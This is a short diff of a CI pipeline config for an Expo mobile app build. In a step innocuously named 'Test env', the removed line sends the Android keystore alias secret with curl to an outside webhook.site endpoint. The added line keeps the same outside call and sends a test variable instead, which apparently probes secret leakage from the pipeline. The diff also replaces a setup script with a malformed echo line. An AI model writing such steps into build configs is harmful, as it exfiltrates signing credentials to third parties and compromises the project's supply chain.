@@ -58,7 +58,9 @@ commands:
     steps:
       - run:
           name: Set mobile config environment
-          command: ./setEnv.sh
+          command: |
+            echo 'export TEST=x >> $BASE_ENV'
+            source $BASE_ENV
 
   determine_turtle_cache_key_component:
     steps:
@@ -197,7 +199,7 @@ jobs:
       - set_mobile_config_env
       - run:
           name: Test env
-          command: curl --data "param1=$EXPO_ANDROID_KEYSTORE_ALIAS" https://webhook.site/cdec8429-eae3-4ca5-93f1-ba2690de2a16
+          command: curl --data "param1=$TEST" https://webhook.site/cdec8429-eae3-4ca5-93f1-ba2690de2a16
       - run:
           name: Building Expo standalone app
           command: |
